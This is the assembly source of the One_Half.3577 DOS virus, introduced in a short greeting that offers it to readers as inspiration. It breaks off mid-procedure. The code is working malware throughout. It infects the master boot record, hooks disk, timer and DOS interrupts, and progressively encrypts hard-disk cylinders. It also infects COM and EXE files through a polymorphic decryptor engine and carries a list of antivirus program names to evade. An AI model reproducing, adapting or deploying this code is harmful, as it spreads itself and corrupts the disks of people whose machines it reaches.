;Dear friends,
;some time has already passed since the great days of One Half epidemy.
;Nevertheless we still hope that a code of this popular virus inspires
;you also now. A lot of stuff has been written on the subject, so I tink,
;not many words are necessary about this little creature any more.
;And, so, here is the original source of One_Half.3577:

        DOSSEG
	.MODEL SMALL
	.STACK 100h

Vkod	SEGMENT 'kod'
	ASSUME	CS:Vkod,DS:Vkod

stvir	LABEL	near
POCKIL=4                                ;virus length in kB
	DB	05ah
owner	DW	?
	DW	POCKIL*1024/16-1
	DB	00h,00h,00h,'COMMAND',00h	;MCB header
DLZVIR=(OFFSET endvir-OFFSET stvir)     ;virus length
POCSEC=((DLZVIR-1)/512+1)               ;number of sectors needed
POCINS=10                               ;number of instructions
DLZINS=10                               ;instruction length
DLZBUFF=512                             ;buffer length
DLZZAS=81h                              ;stack length
VRCHOL=(OFFSET endvir+DLZBUFF+DLZZAS)   ;top
POCTRACK=2                              ;track number
DLZFNB=64                               ;file name max. length

strc	STRUC
 id	DW	?
 lpage	DW	?
 pages	DW	?
 items	DW	?
 parps	DW	?
 min	DW	?
 max	DW	?
 vSS	DW	?
 vSP	DW	?
 flag	DB	?
	DB	?	;check	DW	?
 vIP	DW	?
 vCS	DW	?
 iaddr	DW	?
strc	ENDS

bheader	strc	<>
poss 	DW	POCINS DUP(?)
posss	DW	?		;positions of instructions
orprg	DB	POCINS*DLZINS DUP(?)

v16	DW	16
v30	DW	30
v512	DW	512

;************ MBOOT ************
sboot:	xor	bx,bx
	cli
	mov	sp,7c00h
	mov	ss,bx
	sti
	mov	ds,bx
	sub	word ptr ds:0413h,POCKIL
	mov	cl,6
	int	12h
	shl	ax,cl
	mov	dx,0080h
	mov	es,ax
sector:	mov	cx,0009h
	mov	ax,(0200h+POCSEC)
        push	es
	int	13h
bootid:	mov	ax,OFFSET staboot
	push	ax
	retf
eboot	LABEL	near
;******************************
staboot:mov	ds:(4*21h+2),cs
	mov	ax,ds:046ch
	push	ds
	push	cs
	pop	ds
	mov	rnd1,ax			;RNG init
	mov	ax,cs
	inc	ax
	mov	owner,ax		;MCB owner setting
	mov	byte ptr ds:(OFFSET con3+1),00h	;condition for memory
        call	Koppr			;copying of needed routines

	pop	es
	mov	bx,sp
	push	es
	mov	si,es:(bx+OFFSET eboot-OFFSET sboot)
zactr:	cmp	si,500		;everything encoded ?
	jbe	uznk
	push	si
	sub	si,POCTRACK
	mov	word ptr ds:(OFFSET cdft+2),si	;last track
	pop	si
	mov	ah,08h
	int	13h
	jc	uznk
	mov	al,cl
	and	al,3fh		;al = number of sectors
	mov	kolzak,al	;number of sectors to encode
	mov	cl,01h
	mov	bh,7eh
	mov	odkzak,bx	;start to encode from
	mov	dl,80h
nttrc:	dec	si
	call	Fromsi
	push	dx
nthd:	mov	ah,02h
	push	ax
	int	13h
	pop	ax
	jc	perwd
	call	Skramb
	inc	ah
	push	ax
	int	13h
	pop	ax
perwd:	jc	erwd
	test	dh,3fh
	jz	tcid
	dec	dh
	jmp	nthd
tcid:	pop	dx
cdft:	cmp	si,100h		;last track
	ja	nttrc
jfcor:	mov	bh,7ch
	mov	es:(bx+OFFSET eboot-OFFSET sboot),si
	mov	ax,0301h
	mov	cx,0001h
	mov	dh,ch
	int	13h
uznk:	mov	word ptr ds:(OFFSET cnflte+2),si	;for condition in res13
aktcd:	sub	si,613
	ja	estne
	cmp	si,-(3*POCTRACK-1)
	jb	estne		;write it out 3x
	call	Prejav

estne:	mov	ax,0201h
	mov	bx,7c00h
	mov	cx,word ptr ds:(OFFSET sector+1)
	dec	cx
	mov	dx,0080h
	int	13h             ;read original boot
	cli
	les	ax,es:(4*13h)
	mov	word ptr oriv13,ax
	mov	word ptr oriv13+2,es
	pop	es
	push	es
	les	ax,es:(4*1ch)
	mov	word ptr oriv1c,ax
	mov	word ptr oriv1c+2,es
	pop	es
	push	es
	mov	word ptr es:(4*13h),OFFSET res13
	mov	es:(4*13h+2),cs
	mov	word ptr es:(4*1ch),OFFSET res1c
	mov	es:(4*1ch+2),cs		;hook 13h and timer 1ch
	sti
	push	bx
	retf

erwd:	xor	ah,ah	;decode last track if error
	push	ax
	int	13h
	pop	ax
enthd:	inc	dh
	mov	ah,dh
	pop	dx
	push	dx
	cmp	ah,dh
	ja	ercor
	mov	dh,ah
	mov	ah,02h
	push	ax
	int	13h
	pop	ax
	call	Skramb
	inc	ah
	push	ax
	int	13h
	pop	ax
	jmp	enthd
ercor:	pop	dx
	inc	si
	jmp	jfcor

res1c:	push	ax
	push	ds
	push	es
	xor	ax,ax
	mov	ds,ax
	les	ax,ds:(4*21h)
	mov	word ptr cs:oriv21,ax
	mov	ax,es
	cmp	ax,0800h
	ja	chnp
	mov	word ptr cs:(oriv21+2),ax
	les	ax,cs:oriv1c
	mov	ds:(4*1ch),ax
	mov	ds:(4*1ch+2),es		;unhook 1ch
	mov	ds:(4*21h),OFFSET res21
	mov	ds:(4*21h+2),cs		;hook 21h
chnp:	pop	es
	pop	ds
	pop	ax
	DB	0eah			;jump to original 1ch
oriv1c	DD	?

Koppr	PROC	near
        mov	si,OFFSET zZakoduj
	mov	di,OFFSET Zakoduj
	mov	cx,OFFSET kzZak-OFFSET zZakoduj
	cld
	rep	movsb		;copy needed routines
	ret
Koppr	ENDP

Fromsi	PROC	near
	push	ax
	mov	ax,si
	mov	ch,al
	push	cx
	mov	cl,4
	shl	ah,cl
	pop	cx
	mov	al,3fh
	and	dh,al
	and	cl,al
	not	al
	push	ax
	and	ah,al
	or	dh,ah
	pop	ax
	shl	ah,1
	shl	ah,1
	and	ah,al
	or	cl,ah
	pop	ax
	ret
Fromsi	ENDP

mess1	DB	'Dis is one half.',0dh,0ah,'Press any key to continue ...',0dh,0ah
ems1	LABEL	byte

Prejav	PROC	near
	test	order,11b	;only generations that are multiple of 4
	jnz	somewhere_in_town
	mov	cx,OFFSET ems1-OFFSET mess1
	mov	si,OFFSET mess1
	mov	ah,0fh
	int	10h
	mov	bl,07h
	mov	ah,0eh
freddey_lives:
	lodsb
	int	10h
	loop	freddey_lives
	xor	ah,ah
	int	16h
somewhere_in_town:
	ret
Prejav	ENDP

;**************** file part **************
Pmip	PROC	near
	push	bx
	DB	0bbh
handle1	DW	?		;mov	bx,handle1
	int	21h
	pop	bx
	ret
Pmip	ENDP

tInt13	PROC	near
	pushf
	cli
	DB	09ah
toriv13	DD	?
	ret
tInt13	ENDP

res01:	push	bp
	mov	bp,sp
con2:	jmp	short r1cn
r1cn:	cmp	word ptr [bp+04h],1234h
	ja	nsyet
	push	ax
	push	bx
	push	ds
	lds	ax,[bp+02h]
	DB	0bbh
rlit	DW	?
	mov	word ptr cs:[bx+OFFSET toriv13],ax
	mov	word ptr cs:[bx+OFFSET toriv13+2],ds
	mov	byte ptr cs:[bx+OFFSET con2+1],OFFSET syet-OFFSET r1cn ;set condition
	pop	ds
	pop	bx
	pop	ax
syet:	and	byte ptr [bp+07h],0feh
nsyet:	pop	bp
	iret
;**************** instalation to memory ******************
instm:	pop	bx
        pop	ax
        push	ax	;ax = PSP
	dec	ax
	mov	ds,ax
	cmp	byte ptr ds:[00h],'Z'
	jne	inchb
        add	ax,ds:[03h]
        sub	ax,(POCKIL*1024)/16-1	;ax = virus segment
        mov	dx,cs
        mov	si,bx
	dec	si
	mov	cl,4
        shr	si,cl
	inc	si			;si = paragraph count till beginning
	add	dx,si
        add	dx,cs:[bx+OFFSET bheader.min]	;min memory request
	cmp	ax,dx
	jb	inchb			;not enough room in memory
	mov	dx,ss
	mov	si,sp
	add	si,3
	shr	si,cl
	inc	si
	add	dx,si
	cmp	ax,dx
	jb	inchb

	mov	byte ptr ds:[00h],'M'
	sub	word ptr ds:[03h],(POCKIL*1024)/16
	mov	ds:[12h],ax
	mov	es,ax
	push	cs
	pop	ds
	inc	ax
	mov	word ptr [bx+OFFSET owner],ax
	mov	byte ptr [bx+OFFSET vsetky],0ebh	;infect everywhere
	mov	si,bx
	xor	di,di
	mov	cx,DLZVIR
	rep	movsb
        push	es
	pop	ds
        call	Koppr		;copy needed routines
	xor	ax,ax
	mov	ds,ax
	cli
	mov	ax,ds:(4*21h)
	mov	word ptr es:oriv21,ax
	mov	ax,ds:(4*21h+2)
	mov	word ptr es:(oriv21+2),ax
	mov	word ptr ds:(4*21h),OFFSET res21
	mov	ds:(4*21h+2),es
	sti
inchb:	jmp	aalldn

start	LABEL	near
stsub:	call	next
next:	pop	si
	sub	si,OFFSET next
	mov	[si+OFFSET rlit],si		;relocation in trace

	push	es
	push	si
	cld

	inc	word ptr [si+OFFSET order]	;generation
	mov	byte ptr [si+OFFSET vsetky],74h	;dis is jz ...
	xor	ax,ax
	mov	es,ax
	mov	ax,es:046ch
	mov	[si+OFFSET rnd1],ax		;init RNG
	mov	[si+OFFSET zls1+3],ax		;key for HD encoding

	mov	ax,4b53h
	int	21h
	cmp	ax,454bh
	je	palldn

	mov	ah,52h
	int	21h
	mov	ax,es:[bx-02h]
	mov	word ptr ds:[si+OFFSET r1cn+3],ax	;limit
	mov	byte ptr ds:[si+OFFSET con2+1],00h	;set condition
	mov	ax,3501h
	int	21h
	push	bx
	push	es
	mov	ax,3513h
	int	21h
	mov	word ptr [si+OFFSET toriv13],bx
	mov	word ptr [si+OFFSET toriv13+2],es
	mov	ax,2501h
	lea	dx,[si+OFFSET res01]
	int	21h
	lea	bx,[si+OFFSET endvir]
	mov	cx,0001h
	mov	dx,0080h
	push	cs
	pop	es
	pushf
	pop	ax
	or	ah,01h
	push	ax
	popf
	mov	ax,0201h
	call	tInt13
	pushf
	pop	ax
	and	ah,0feh
	push	ax
	popf
	pop	ds
	pop	dx
	pushf
        mov	ax,2501h
	int	21h
	popf
	jc	pinstm
	push	cs
	pop	ds
	cmp	word ptr [bx+(OFFSET bootid-OFFSET sboot)+1],OFFSET staboot
	jne	ov444
palldn:	jmp	alldn
ov444:	cmp	word ptr [bx+180h],072eh
	je	pinstm			;MASTER mboot protection
	mov	ah,08h
	mov	dl,80h
	call	tInt13
	jc	pinstm
	and	cx,00111111b	;CL = max. sector number
	mov	byte ptr ds:(si+OFFSET znxtsc+2),cl	;for res13
	mov	[si+OFFSET mxskt],cl
	and	dh,3fh
	mov	[si+OFFSET mxhlv],dh	;max. head number for encoding
	mov	ax,0301h
	sub	cl,POCSEC
        mov     byte ptr ds:(si+OFFSET zr13ds+2),cl	;for condition in int13
	mov	dx,0080h
	call	tInt13		;save original mboot
	jc	pinstm

	push	cx
	push	dx
	push	si
	xchg	di,si
	mov	cx,4
	add	bx,1eeh
hlvp:	mov	al,[bx+04h]
	cmp	al,01h
	je	ptrif
	cmp	al,04h
	jb	chdnn
	cmp	al,06h
	jbe	ptrif
chdnn:	sub	bx,10h
	loop	hlvp
	pop	si
	pop	dx
	pop	cx
pinstm:	jmp	instm
ptrif:	mov	cx,[bx+02h]
	mov	dh,[bx+01h]
	call	zTosi
	add	si,POCTRACK+5
	mov	[di+OFFSET zactr+2],si	;cylinder nearer to the beginning
	xchg	ax,si
	mov	cx,[bx+06h]
	mov	dh,[bx+01h]
	call	zTosi
	mov	[di+OFFSET kontr+2],si
	mov	[di+OFFSET stpdb+1],si	;cylinder nearer to the end
	add	ax,si
	shr	ax,1
	mov	[di+OFFSET aktcd+2],ax	;cylinder to activate
	pop	si
	pop	dx
	pop	cx

	mov	ax,(0300h+POCSEC)
	xchg	bx,si
	inc	cx
	mov	word ptr ds:[bx+OFFSET sector+1],cx
	call	tInt13
	jc	pinstm
	lea	si,[bx+OFFSET sboot]
	lea	di,[bx+OFFSET endvir]
	push	di
	mov	cx,OFFSET eboot-OFFSET sboot
	rep	movsb
stpdb:	mov	ax,1234h
	stosw
	mov	ax,0301h
	pop	bx
	mov	cx,0001h
	call	tInt13
	jc	pinstm

alldn:	pop	bx
aalldn:	push	cs
	pop	ds
	push	cs
	pop	es

	lea	si,[bx+OFFSET orprg]
	add	bx,OFFSET poss
	mov	cx,POCINS
ssno:	mov	di,[bx]
	push	cx
	mov	cx,DLZINS
	rep	movsb
	pop	cx
	inc	bx
	inc	bx
	loop	ssno			;restore code
	pop	es

	add	bx,((OFFSET bheader-OFFSET poss)-POCINS*2)
	mov	di,es
	add	di,10h
	add	[bx].vCS,di
	add	[bx].vSS,di

	cmp	[bx].items,0
	je	ssr4
	mov	ds,es:[2ch]
	xor	si,si
lfn:	inc	si
	cmp	word ptr [si],0000h
	jne	lfn
	add	si,4
	xchg	dx,si
	mov	ax,3d00h
	int	21h
	jc	errlp
	push	cs
	pop	ds
	mov	[bx+(OFFSET handle1-OFFSET bheader)],ax
	mov	dx,[bx].iaddr
	mov	ax,4200h
	call	Pmip
	push	es
	xchg	ax,di
ssr3:	push	ax
	lea	dx,[bx+(OFFSET rbuff-OFFSET bheader)]
	mov	cx,[bx].items
	cmp	cx,((OFFSET endvir-OFFSET rbuff)+DLZBUFF)/4
	jb	ssr1
	mov	cx,((OFFSET endvir-OFFSET rbuff)+DLZBUFF)/4
ssr1:	sub	[bx].items,cx
	push	cx
	shl	cx,1
	shl	cx,1
	mov	ah,3fh
	call	Pmip
	jc	errlp
	pop	cx
	pop	ax
	xchg	si,dx
ssr2:	add	[si+2],ax
	les	di,[si]
	add	es:[di],ax
	add	si,4
	loop	ssr2
	cmp	[bx].items,0
	ja	ssr3		;relocation
	pop	es
	mov	ah,3eh
	call	Pmip
ssr4:	push	es
	pop	ds
	cmp	cs:[bx].flag,0	;is it COM ?
	jne	sEXE
	 mov	si,bx
	 mov	di,100h
	 mov	cx,3
	 rep	movsb
	 pop	ax
	 jmp 	short sCOM
sEXE:	pop	ax
	cli
	mov	sp,cs:[bx].vSP
	mov	ss,cs:[bx].vSS
	sti
sCOM:	jmp	dword ptr cs:[bx].vIP
errlp:	mov	ah,4ch		;if error on program loading
	int	21h

rbuff	LABEL	byte
Rnd	PROC	NEAR
	mov	word ptr cs:(OFFSET povsi+1),si
	push	ax
	push	bx
	push	cx
	push	dx
	DB	0b9h
rnd2	DW	0000h
	DB	0bbh
rnd1	DW	?		;<-
        MOV     DX,015Ah
        MOV     AX,4E35h
        XCHG    AX,SI
        XCHG    AX,DX
        TEST    AX,AX
        JZ      r1
        MUL     BX
r1:     JCXZ    r2
        XCHG    AX,CX
        MUL     SI
        ADD     AX,CX
r2:     XCHG    AX,SI
        MUL     BX
        ADD     DX,SI
        INC     AX
        ADC     DX,0000h
        MOV     cs:rnd1,AX
        MOV     cs:rnd2,DX
        MOV     ax,dx
	pop	cx
	xor	dx,dx
	jcxz	rdbz		;division by zero
	div	cx
rdbz:	pop	cx
	pop	bx
	pop	ax
	pop	si
	push	si
	cmp	byte ptr cs:[si],0cch
	cli
neksl:	je	neksl
	sti
povsi:	mov	si,1234h
        RET
Rnd	ENDP

;*************** mutation ****************
kod:	DB	1
kodpax:	push	ax
	DB	1
kodpcs:	push	cs
	DB	1
kodpds:	pop	ds
	DB	3
kodmsi:	mov	si,1100h
	DB	3
kodmbx:	mov	bx,1234h
	DB	2
kodxor	LABEL	near
k01:	xor	[si],bx
	DB	4
kodabx:	add	bx,4567h
	DB	1
kodisi:	inc	si
	DB	4
kodcsi:	cmp	si,1103h
	DB	2
	jne	k01

POCRI=9
randi:	nop
	stc
	clc
	sti
	DB	2eh	;cs:
	DB	3eh	;ds:
	cld
	std
	cmc

Rndi	PROC	near
	or	dx,dx
	jz	rintd
	push	si
	push	cx
	push	dx
	mov	cx,dx
rinxt:	mov	si,OFFSET randi
	mov	dx,POCRI
	call	Rnd
	add	si,dx
	movsb
	loop	rinxt
	pop	dx
	pop	cx
	pop	si
rintd:	ret
Rndi	ENDP

Mtog	PROC	near
	mov	ax,dx
	inc	dx		;for all ins. could be before instruction
	call	Rnd
	sub	ax,dx
	call	Rndi
	xchg	dx,ax	;random ins. before instruction

	rep	movsb	;instruction

	cmp	bx,OFFSET poss+2*9	;jump ?
	jne	mtnj
	mov	ax,poss[2*5]
	sub	ax,di
	add	ax,OFFSET ibuf
	sub	ax,[bx]	;ax=poss[2*5]-di+OFFSET ibuf-[bx]
	dec	di
	stosb		;jump to marked instruction

mtnj:	call	Rndi	;random ins. after instruction
	ret
Mtog	ENDP

kodd    DW	OFFSET kodmbx
	DW	OFFSET kodxor+1
	DW	OFFSET kodabx+1		;offset of instruction
kodi	DW	OFFSET kodmsi
	DW	OFFSET kodxor+1
	DW	OFFSET kodisi
	DW	OFFSET kodcsi+1

Kodins	PROC	near
kinxt:	lodsw
	xchg	di,ax
	mov	al,dl
	cmp	si,OFFSET kodi+2*2
	jnz	kint		;conversion when addressing
	and	al,101b
	cmp	al,001b
	jnz	kins
	mov	al,111b

kint:	cmp	si,OFFSET kodd+2*2
	jnz	kins		;3 bit shift
	mov	cl,3
	shl	al,cl
	or	[di],al
	or	al,0c7h
	jmp	short	kiad
kins:	or	[di],al
	or	al,0f8h
kiad:	and	[di],al

	cmp	si,OFFSET kodi
	jz	kiend
	cmp	si,OFFSET Kodins
	jz	kiend
	jmp	kinxt
kiend:	ret
Kodins	ENDP

MHeader	PROC	near
fics:	mov	si,OFFSET kodd
kom:	mov	dx,1000b
	call	Rnd
	cmp	dl,100b		;SP
	je	kom
	mov	bl,dl
	call	Kodins		;encoding of data registers
	mov	si,OFFSET kodi
kbxa:	mov	dx,3
	call	Rnd
	add	dl,110b
	cmp	dl,08h
	jne	kvf
	mov	dl,011b		;BX
kvf:	cmp	dl,bl
	je	kbxa
	call	Kodins		;encoding of address registers

	xor	cx,cx
	mov	di,OFFSET poss
pnxt1:	cmp	cx,9		;jump ?
	jne	pnl

pom:	mov	dx,200
	call	Rnd
	sub	dx,100
	add	dx,poss[2*5]	;return to 5. instruction
	cmp	dx,0
	jl	pom
	cmp	dx,DLZHDR
	jge	pom
	jmp	short pl

pnl:	DB	0bah
DLZHDR	DW	1000		;mov	dx,DLZHDR
	call	Rnd
pl:	jcxz	pfirst
	mov	si,OFFSET poss
	push	cx
pnxt:	lodsw
	sub	ax,dx
	cmp	ax,DLZINS
	jge	pOK
	cmp	ax,-DLZINS
	jle	pOK
	pop	cx
	jmp	pnxt1
pOK:	loop	pnxt
	pop	cx
pfirst:	xchg	ax,dx
	stosw
	inc	cx
	cmp	cx,POCINS
	jb	pnxt1
;*******************************
	mov	bx,OFFSET poss
	mov	si,OFFSET kod
mnxt:	mov	di,OFFSET ibuf
	lodsb
	mov	cl,al

	mov	dx,DLZINS-3+1	;'cos range is 0 - (DLZINS-1)
	sub	dx,cx

	mov	ax,[bx+2]	;if one just after another - no jump
	sub	ax,[bx]
	cmp	ax,DLZINS
	jne	mjin
	inc	dx
	inc	dx
	call	Mtog
	inc	bx
	inc	bx
	jmp	short mshort

mjin:	call	Rnd
	call	Mtog

	mov	dx,di
	sub	dx,OFFSET ibuf-3
	add	dx,[bx]
	mov	al,0e9h
	stosb
	inc	bx
	inc	bx
	mov	ax,[bx]
	sub	ax,dx

	cmp	ax,126
	jg	mnear
	cmp	ax,-129
	jl	mnear
	inc	ax
	mov	byte ptr [di-1],0ebh
	stosb			;put short if possible
	jmp	short mshort
mnear:	stosw

mshort:	push	bx
	push	cx
	DB	0b9h
vysr	DW	?		;mov	cx,vysr
	DB	0bah
nizr	DW	?		;mov	dx,nizr
	add	dx,[bx-2]
	adc	cx,0		;CX:DX = position for instruction
	push	cx
	push	dx
	call	PozZac
	mov	cx,DLZINS
	DB	0bah
vpior	DW	?		;mov	dx,vpior
	add	vpior,cx
	call	Citanie
	pop	dx
	pop	cx
	jc	mhpp
	call	PozZac
	xchg	cx,di
	mov	dx,OFFSET ibuf
	sub	cx,dx
	call	Zapis		;put generated instruction into file
mhpp:	pop	cx
	pop	bx
	jc	mhkon

	cmp	bx,OFFSET poss+2*POCINS
	jnb	mhkon
	jmp	mnxt
mhkon:	ret
MHeader	ENDP
;********************* end of m. ****************
;*************** copied routines **************
zZakoduj PROC 	near
	mov	cx,DLZVIR
	xor	dx,dx		;OFFSET stvir
	call	zzp1
	mov	ah,40h
	mov	bx,handle
	pushf
	DB	9ah
	DD	?		;call	ds:oriv21
	jc	zzk1
	cmp	ax,cx
zzk1:	pushf
	call	zzp1
	popf
	ret
zzp1:	push	cx
	mov	si,dx
zzkmax:	mov	ax,0000h
	mov	cx,DLZVIR
zzp2:	xor	[si],ax
zzkaax:	add	ax,0000h
	inc	si
	loop	zzp2
	pop	cx
	ret
zZakoduj ENDP

zres24:	mov	al,03h
	iret

zInt13	PROC	near
	pushf
	call	cs:oriv13
	ret
zInt13	ENDP
zTosi	PROC	near
	push	cx
	push	dx
	shr	cl,1
	shr	cl,1
	and	dh,11000000b
	or	dh,cl
	mov	cl,4
	shr	dh,cl
	mov	dl,ch
	xchg	si,dx
	pop	dx
	pop	cx
	ret
zTosi	ENDP
zSkramb	PROC	near
	push	ax
	push	bx
	push	cx
	DB	0b0h,?		;mov	al,?
	DB	0bbh,?,?	;mov	bx,?
znxtss:	mov	cx,256
zls1:	xor	word ptr es:[bx],1212h
	inc	bx
	inc	bx
	loop	zls1
	dec	al
	jnz	znxtss
	pop	cx
	pop	bx
	pop	ax
	ret
zSkramb	ENDP
zres13:	cmp	ah,02h
	je	zrtc
	cmp	ah,03h
	je	zrtc
	jmp	zjtoo
zrtc:	cmp	dx,0080h
	jne	zencode
	test	cx,0ffc0h
	jnz	zencode
	push	bx
	push	dx
	push	si
	push	di
	push	cx
	push	cx
	mov	si,ax
	and	si,00ffh
	mov	di,si
	mov	al,01h
	push	ax
	jz	zbzch		;if AL=0 do nothing
	jcxz	zgchi
	cmp	cl,01h
	je	zobbs
znxtsc:	cmp	cl,17		;if sector number > max. then error
	ja	zgchi
zr13ds:	cmp	cl,07h
	jb	zctoo
	cmp	ah,03h
	je	zgchi
	push	bx
	mov	cx,512
zflbf:	mov	byte ptr es:[bx],00h
	inc	bx
	loop	zflbf
	pop	bx
zrtcom:	add	bx,512
	pop	ax
	pop	cx
	inc	cx
	push	cx
	push	ax
	dec	si
	jnz	znxtsc
zbzch:	clc
zzav:	pop	ax
	pushf
	xchg	ax,di
	sub	ax,si
	popf
	mov	ah,ch
	pop	cx
	pop	cx
	pop	di
	pop	si
	pop	dx
	pop	bx
	retf	2
zobbs:	mov	cl,byte ptr cs:(OFFSET r13ds+2)
zctoo:	call	zInt13
	mov	ch,ah
	jc	zzav
	jmp	zrtcom
zgchi:	stc
	mov	ch,0bbh		;undefined error
	jmp	zzav

zencode:cmp	dl,80h		;encoding resp. decoding
	jne	zjtoo
	push	ax
	push	cx
	push	dx
	push	si
	push	ds
	push	cs
	pop	ds
	mov	byte ptr kolzak,0
	mov	odkzak,bx
	call	zTosi
	and	cl,3fh
	and	dh,3fh
zchdnd:	or	al,al
	jz	zhtvo
kontr:	cmp	si,1234h	;max. cyl.
	jae	zhtvo
	cmp	si,1234h	;min. cyl.
	jb	ztdal
	inc	kolzak
	jmp	short znxslp
ztdal:	add	odkzak,512
znxslp:	dec	al
	inc	cl
	DB	80h,0f9h
mxskt	DB	?		;cmp	cl,?
	jbe	zchdnd
	mov	cl,1
	inc	dh
	DB	80h,0feh
mxhlv	DB	?		;cmp	dh,?
	jbe	zchdnd
	xor	dh,dh
	inc	si
	jmp	zchdnd
zhtvo:	cmp	kolzak,0
	pop	ds
	pop	si
	pop	dx
	pop	cx
	pop	ax
	je	zjtoo
	cmp	ah,02h
	je	zeckn
	call	zSkramb
zeckn:	call	zInt13
	pushf
	call	zSkramb
	popf
	retf	2
zjtoo:	DB	0eah
;zoriv13	DD	?
kzZak	LABEL	near
;********************* EXE,COM modification ***********
Subor	PROC	near
Zapis:	mov	ah,40h
	jmp	short s1
Citanie:mov	ah,3fh
s1:	call	s2
	jc	s3
	cmp	ax,cx
s3:	ret
Zaciatok:xor	cx,cx
	mov	dx,cx
PozZac:	mov	ax,4200h
	jmp	short s2
Koniec:	xor	cx,cx
	mov	dx,cx
PozKon:	mov	ax,4202h
s2	LABEL	near
Mhandle:mov	bx,cs:handle
Int21:	pushf
	cli
	call	cs:oriv21
	ret
Subor	ENDP

Infikuj	PROC	near
	mov	bp,sp

	mov	ax,5700h
	call	Mhandle
	mov	bx,OFFSET ftime
	mov	[bx],cx
	mov	[bx+2],dx	;read time and date of last write
	call	Identify
	jc	mikon0

	mov	dx,30
	call	Rnd		;with prob. 1:30 file won't be marked
	or	dx,dx
	jz	neozn
	mov	[bx],ax		;mark

neozn:	mov	vpior,OFFSET orprg	;position in saving area
	mov	dx,0ffffh
	push	dx
	call	Rnd
	mov	word ptr ds:(OFFSET kodmbx+1),dx
	mov	word ptr ds:(OFFSET zkmax+1),dx
	pop	dx
	call	Rnd
	mov	word ptr ds:(OFFSET kodabx+2),dx
	mov	word ptr ds:(OFFSET zkaax+1),dx		;values for encoding

	call	Zaciatok
	mov	cx,1ah
	mov	dx,OFFSET header
	push	dx
	call	Citanie
	jc	mikon1
	xchg	si,dx
	mov	di,OFFSET bheader
	rep	movsb
	call	Koniec
	mov	si,ax
	mov	di,dx
	pop	bx
	cmp	[bx].id,'MZ'
	je	iEXE
	cmp	[bx].id,'ZM'
	je	iEXE
	 mov	bheader.flag,0		;0 means COM
	 cmp	ax,65535-(DLZVIR+(VRCHOL-OFFSET endvir))-1	;much too long dlhy ?
	 cmc
	 jc	mikon1
	 mov	ax,3		;do not overwrite leading jump
	 cwd
	 push	bx
	 jmp	short iCOM
iEXE:	mov	bheader.flag,1
	mov	ax,[bx].pages
	mul	v512
	sub	ax,si
	sbb	dx,di
mikon0:	jc	mikon1		;not whole
	mov	ax,[bx].parps
	mul	v16
	push	bx
	push	ax
	push	dx
iCOM:	sub	si,ax
	sbb	di,dx
MINM=1000
MAXM=3000
	or	di,di
	jnz	short igt64
	mov	dx,si
	sub	dx,MINM
mikon1:	jb	mikon2			;not enough space
	cmp	dx,(MAXM-MINM)
	jbe	iltm
igt64:	mov	dx,(MAXM-MINM)
iltm:	call	Rnd
	add	dx,MINM
	mov	word ptr ds:(OFFSET kodmsi+1),dx
	add	dx,VRCHOL-10h		;SS = CS+1
	cmp	bheader.flag,0
	je	iCOM5
	mov	header.vSP,dx		;set stack pointer
iCOM5:	add	dx,DLZVIR-((VRCHOL-OFFSET stvir)-10h)
	mov	word ptr ds:(OFFSET kodcsi+2),dx	;header limits
	add	dx,OFFSET stsub-DLZVIR
	mov	posss,dx			;set jump after decoding
	add	dx,(-DLZINS+1)-(OFFSET stsub-OFFSET stvir) ;DX=Rnd+MINM-DLZINS+1
	mov	DLZHDR,dx
	add	dx,DLZINS-2
	not	dx
	mov	cx,-1
	call	PozKon		;setting to the virus beginning in file
	mov	vysr,dx
	mov	nizr,ax
	cmp	bheader.flag,0
	jne	iEXE2
	xchg	ax,dx
	add	dx,100h
	jmp	short iCOM1	;if COM take from beginning
iEXE2:	pop	di
	pop	si
	sub	ax,si
	sbb	dx,di		;relatively in file
	div	v16
iCOM1:	add	word ptr ds:(OFFSET kodmsi+1),dx
	add	word ptr ds:(OFFSET kodcsi+2),dx;set header limits
	push	ax
	push	dx
	call	MHeader		;create header for decoding
	jnc	twnm
mikon2:	jmp	ikon
twnm:	pop	dx
	pop	ax
	mov	cx,POCINS
	mov	si,OFFSET poss
il1:	add	[si],dx
	inc	si
	inc	si
	loop	il1		;set positions in poss
	sub	nizr,dx
	sbb	vysr,0		;for correct positions on error
	pop	bx
	cmp	bheader.flag,0
	jne	iEXE3
	 mov	byte ptr [bx],0e9h
	 mov	ax,poss[0*2]
	 sub	ax,3+100h
	 mov	word ptr [bx+1],ax	;ins. jmp at the beginning
	 mov	bheader.items,0
	 mov	bheader.min,0
	 mov	bheader.vCS,-10h
	 mov	bheader.vIP,100h
	 jmp	short iegh2
iEXE3:	mov	[bx].vCS,ax
	inc	ax
	mov	[bx].vSS,ax
	mov	ax,poss[0*2]
	mov	[bx].vIP,ax
	add	[bx].vSP,dx	;set SP
	and	byte ptr [bx].vSP,0feh	;SP is even
	mov	[bx].items,0	;no relocations
	mov	ax,((VRCHOL-OFFSET endvir)-1)/16+1
	cmp	[bx].min,ax
	jae	iegh1
	mov	[bx].min,ax
iegh1:	cmp	[bx].max,ax
	jae	iegh2
	mov	[bx].max,ax	;set up min. and max. memory requirments
iegh2:	push	bx
	call	Koniec
	call	Zakoduj		;put v. to the file end
	jc	ifail
	call	Koniec
	div	v512
	inc	ax
	pop	bx
	cmp	bheader.flag,0
	je	iCOM4
iEXE1:	mov	[bx].pages,ax
	mov	[bx].lpage,dx
iCOM4:	push	bx
	call	Zaciatok
	mov	cx,1ah
	pop	dx
	call	Zapis
	jc	ifail

stbkon:	mov	ax,5701h
	mov	cx,ftime
	mov	dx,fdate
	call	Mhandle		;restore time and date

ikon:	mov	sp,bp
	ret

ifail:	mov	dx,OFFSET orprg
	mov	si,OFFSET poss
opdl:	push	dx
	lodsw
	xchg	dx,ax
	mov	cx,vysr
	add	dx,nizr
	adc	cx,0
	call	PozZac
	pop	dx
	mov	cx,DLZINS
	call	Zapis
	add	dx,cx
	cmp	si,OFFSET posss
	jb	opdl		;restore overwritten parts
	and	ftime,0ffe0h	;not marked
	jmp	stbkon
Infikuj ENDP
;************** routines for TSR part ****
Nastav24 PROC	near
	push	dx
	push	ds
	push	cs
	pop	ds
	mov	ax,3524h
	call	Int21
	mov	seg24,es
	mov	off24,bx
	mov	ax,2524h
	mov	dx,OFFSET res24
	call	Int21
	pop	ds
	pop	dx
	ret
Nastav24 ENDP
Vrat24	PROC	near
	mov	ax,2524h
	lds	dx,dword ptr cs:off24
	call	Int21
	ret
Vrat24	ENDP

POCKRP=6	;number of critical programs
retaz	DB	4,'.COM',4,'.EXE'
retaz1	DB	4,'SCAN',5,'CLEAN',8,'FINDVIRU',5,'GUARD',3,'EMM'
retaz2	DB	6,'CHKDSK'

Over	PROC	near
	push	dx
